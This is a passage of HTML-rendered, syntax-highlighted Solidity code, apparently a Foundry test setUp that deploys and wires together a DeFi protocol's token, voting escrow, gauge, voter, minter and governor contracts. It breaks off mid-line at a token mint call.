\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xAD\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprotocol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetUp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eBlack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGARole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;GAUGE_ADMIN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRoleFor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGARole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//needs to be initialized\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eAutoVotingEscrowManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//needs to be initialized\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eRewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eGaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eGaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e( \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e( \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eMinterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBlackHoleVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetDepositor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetVoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, 